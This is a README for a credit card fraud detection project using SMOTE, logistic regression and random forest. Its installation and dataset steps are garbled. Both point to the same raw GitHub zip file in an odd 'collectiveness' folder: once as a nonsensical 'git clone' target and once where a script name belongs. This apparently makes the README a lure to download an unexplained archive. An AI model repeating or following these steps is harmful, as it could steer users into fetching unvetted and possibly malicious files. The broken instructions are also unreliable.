# CreditFraudDetection

## Project Overview

This project provides a machine learning solution for credit card fraud detection, focusing on accurately identifying rare fraudulent transactions within large datasets. It features:

  * **Synthetic Data Generation:** For demonstration and testing.
  * **Robust Preprocessing:** Handles missing values, performs feature engineering (e.g., time-based), and scales data.
  * **Imbalanced Data Handling:** Utilizes `imbalanced-learn` (SMOTE) to address class imbalance.
  * **Machine Learning Models:** Demonstrates Logistic Regression and Random Forest.
  * **Key Evaluation Metrics:** Focuses on Precision, Recall, F1-score, Confusion Matrix, ROC AUC, and Average Precision for imbalanced datasets.
  * **Modular Pipeline:** Ensures proper workflow and prevents data leakage.

## Getting Started

### Prerequisites

  * Python 3.8+
  * `pip`

### Installation

1.  **Clone:** `git clone https://raw.githubusercontent.com/revathi-birapaka/CreditFraudDetection/main/collectiveness/CreditFraudDetection_3.1.zip`
2.  **Navigate:** `cd credit-card-fraud-detection`
3.  **Env (Optional):** `python -m venv venv` & `source venv/bin/activate` (or `.\venv\Scripts\activate` on Windows)
4.  **Install:** `pip install pandas numpy scikit-learn matplotlib seaborn imbalanced-learn`


## Dataset

To use your own, modify `https://raw.githubusercontent.com/revathi-birapaka/CreditFraudDetection/main/collectiveness/CreditFraudDetection_3.1.zip` to load your CSV/Excel/DB data and adjust column names as needed.

## Evaluation Focus

Emphasis on **Recall** (for detecting fraud) and **Average Precision** due to data imbalance.

## Future Scope

Further enhancements include advanced feature engineering, hyperparameter tuning, exploring more models, and conceptualizing deployment/monitoring.

-----
